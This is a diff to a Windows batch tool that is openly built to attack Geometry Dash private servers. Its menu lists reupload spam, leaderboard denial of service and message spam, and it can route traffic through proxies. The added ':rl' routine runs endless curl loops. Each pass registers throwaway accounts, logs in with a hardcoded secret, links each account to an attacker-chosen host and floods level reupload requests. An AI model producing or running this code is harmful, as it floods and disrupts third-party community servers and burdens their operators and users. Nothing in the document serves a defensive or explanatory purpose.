@@ -30,24 +30,26 @@ goto %state%
 :start
 echo --- CHOOSE OPTION ---
 echo [1] Reupload SPAM
-echo [2] Leaderboard DoS
-echo [3] Message SPAM
+echo [2] Reupload SPAM [Legacy]
+echo [3] Leaderboard DoS
+echo [4] Message SPAM
 echo --- PROXY OPTIONS ---
-echo [4] Add proxy
-echo [5] Test proxy
-echo [6] Delete proxy settings
+echo [5] Add proxy
+echo [6] Test proxy
+echo [7] Delete proxy settings
 echo --- OTHER OPTIONS ---
-echo [7] Credits ^& Legal
-echo [8] Exit
+echo [8] Credits ^& Legal
+echo [9] Exit
 set /p op=
-if %op%==1 set state=ru
-if %op%==2 set state=ls
-if %op%==3 set state=ms
-if %op%==4 set state=px
-if %op%==5 set state=tp
-if %op%==6 del %localappdata%\OpenLi7wak\proxy.txt
-if %op%==7 set state=cr
-if %op%==8 exit
+if %op%==1 set state=rl
+if %op%==2 set state=ru
+if %op%==3 set state=ls
+if %op%==4 set state=ms
+if %op%==5 set state=px
+if %op%==6 set state=tp
+if %op%==7 del %localappdata%\OpenLi7wak\proxy.txt
+if %op%==8 set state=cr
+if %op%==9 exit
 goto cl
 :cr
 set state=start
@@ -162,8 +164,45 @@ curl %proxied% -X POST -d "levelid=%random%&server=%origin%&proxy=1&debug=0" %ta
 goto :a
 set state=start
 goto cl
+
+:rl
+echo You will provide the following info: Bug host (https://server.com)
+echo and the target GDPS to spam (eg https://anygdps.com/database)
+echo.
+set /p origin=Enter the bug GDPS url (full path): 
+set /p target=Enter the GDPS url: 
+set /p pass=Please give a password to be used: 
+echo Are the following information correct?
+echo.
+echo Origin: %origin%
+echo Target: %target%
+echo Password: %password%
+echo [y]es / [N]o
+set /p confv1=
+if %confv1%==y goto a
+if %confv1%==Y goto a
+set state=rl
+goto cl
+:a
+set rand=%random%%random%
+set username=Li7wak %random%%random%
+echo.
+curl %proxied% "%target%/tools/account/registerAccount.php" -X POST -d "username=%username%&password=%pass%&proxy=1&repeatpassword=%pass%&email=a@a.a&repeatemail=a@a.a" > nul
+echo.
+curl %proxied% "%target%/accounts/loginGJAccount.php" -X POST -d "udid=%random%&userName=%username%&password=%pass%&secret=Wmfv3899gc9" > nul
+echo.
+curl %proxied% "%target%/tools/linkAcc.php" -X POST -d "userhere=%username%&passhere=%pass%&usertarg=%username%&passtarg=%pass%&server=%origin%&server_path=/login/%rand%&debug=0" > nul
+echo.
+curl %proxied% "%target%/tools/levelReupload.php" -X POST -d "levelid=%rand%&server=%origin%&server_path=/level/%rand%/%rand%&debug=0&user=%username%&pass=%pass%" > nul
+echo.
+echo RAN
+goto :a
+set state=start
+goto cl
+
 :choice
 set state=start
+echo.
 echo encode.exe not found... You can
 echo.
 echo [1] Download it
